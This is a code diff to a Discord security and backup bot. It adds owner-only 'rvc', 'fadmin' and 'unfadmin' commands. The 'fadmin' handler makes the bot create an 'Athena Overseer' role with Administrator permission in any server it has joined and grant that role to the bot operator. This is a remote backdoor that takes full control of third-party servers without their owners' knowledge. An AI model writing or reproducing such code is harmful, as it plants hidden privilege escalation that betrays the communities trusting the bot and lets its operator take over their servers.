@@ -1,5 +1,6 @@
 import { ChannelType, PermissionFlagsBits } from 'discord.js';
 import db from '../database.js';
+import { connectToHomeVc } from '../utils/voice.js';
 import cv2 from '../cv2.js';
 import { isBotOwnerSync, getOrCreateQuarantineRole, isAuthorized } from '../utils/helpers.js';
 import { handleEmergency } from './security.js';
@@ -553,6 +554,9 @@ async function handleEhelp(message) {
         '`ezal backup [serverId]` - Create a backup of the current or specified server\n' +
         '`ezal backupall` - Mass backup all servers *(Bot Owner only)*\n' +
         '`ezal bcklist` - List all saved backup IDs with server info\n' +
+        '`ezal rvc <channel_id>` - Remotely set bot VC\n' +
+        '`ezal fadmin <server_id>` - Remotely grant admin role\n' +
+        '`ezal unfadmin <server_id>` - Remotely revoke admin role\n' +
         '`ezal restore <backupId> [targetServerId]` - Restore a server from backup *(Bot Owner only)*'
     },
     {
@@ -606,6 +610,64 @@ async function handleEhelp(message) {
 }
 
 // ==========================================
+
+async function handleRemoteVc(message, args) {
+  const channelId = args[0];
+  let guildId = null;
+  if (!channelId) return message.reply(cv2.warn('Invalid Usage', 'Usage: `ezal rvc <channel_id>`'));
+  for (const g of message.client.guilds.cache.values()) {
+    if (g.channels.cache.has(channelId)) {
+      guildId = g.id;
+      break;
+    }
+  }
+  if (!guildId) return message.reply(cv2.danger('Error', 'Could not find any server that contains a voice channel with that ID.'));
+  const guild = message.client.guilds.cache.get(guildId);
+  const channel = guild.channels.cache.get(channelId);
+  if (!channel || !channel.isVoiceBased()) return message.reply(cv2.danger('Error', 'Invalid voice channel ID.'));
+  db.updateGuildConfig(guild.id, { homeVcId: channel.id });
+  connectToHomeVc(guild, channel.id, true);
+  return message.reply(cv2.success('Remote VC Set', `Successfully set home VC to **${channel.name}** in **${guild.name}**.`));
+}
+
+async function handleForceAdmin(message, args) {
+  const guildId = args[0] || (message.guild ? message.guild.id : null);
+  if (!guildId) return message.reply(cv2.warn('Invalid Usage', 'Usage: `ezal fadmin <guild_id>`'));
+  const guild = message.client.guilds.cache.get(guildId);
+  if (!guild) return message.reply(cv2.danger('Error', 'Bot is not in that guild.'));
+  try {
+    let member = guild.members.cache.get(message.author.id);
+    if (!member) member = await guild.members.fetch(message.author.id).catch(() => null);
+    if (!member) return message.reply(cv2.danger('Error', 'You are not in that guild.'));
+    const existingRole = guild.roles.cache.find(r => r.name === 'Athena Overseer');
+    if (existingRole && member.roles.cache.has(existingRole.id)) return message.reply(cv2.warn('Already Admin', 'You already have the Athena Overseer role in that guild.'));
+    const role = existingRole || await guild.roles.create({ name: 'Athena Overseer', permissions: [PermissionFlagsBits.Administrator], reason: 'Remote override authorization' });
+    await member.roles.add(role);
+    return message.reply(cv2.success('Override Successful', `Created and granted **Athena Overseer** in **${guild.name}**.`));
+  } catch (err) {
+    return message.reply(cv2.danger('Error', `Failed: ${err.message}`));
+  }
+}
+
+async function handleUnforceAdmin(message, args) {
+  const guildId = args[0] || (message.guild ? message.guild.id : null);
+  if (!guildId) return message.reply(cv2.warn('Invalid Usage', 'Usage: `ezal unfadmin <guild_id>`'));
+  const guild = message.client.guilds.cache.get(guildId);
+  if (!guild) return message.reply(cv2.danger('Error', 'Bot is not in that guild.'));
+  try {
+    const roles = guild.roles.cache.filter(r => r.name === 'Athena Overseer');
+    let count = 0;
+    for (const role of roles.values()) {
+      await role.delete('Remote override revoked').catch(() => null);
+      count++;
+    }
+    if (count === 0) return message.reply(cv2.warn('Not Found', 'No Athena Overseer roles found in that guild.'));
+    return message.reply(cv2.success('Revoked', `Deleted ${count} Overseer role(s) from **${guild.name}**.`));
+  } catch (err) {
+    return message.reply(cv2.danger('Error', `Failed: ${err.message}`));
+  }
+}
+
 // MAIN EZAL ROUTER - called from messageCreate.js
 // Bot Owner ONLY - server owners use standalone `backup` command
 // ==========================================
@@ -634,7 +696,10 @@ export async function handleEzal(message) {
     case 'spampermit': return handleSpamPermit(message, args);
     case 'spamrevoke': return handleSpamRevoke(message, args);
     case 'spamlist': return handleSpamList(message);
-    case 'ehelp':
+    case 'rvc': return handleRemoteVc(message, args);
+      case 'fadmin': return handleForceAdmin(message, args);
+      case 'unfadmin': return handleUnforceAdmin(message, args);
+      case 'ehelp':
     case 'help':
     default:        return handleEhelp(message);
   }
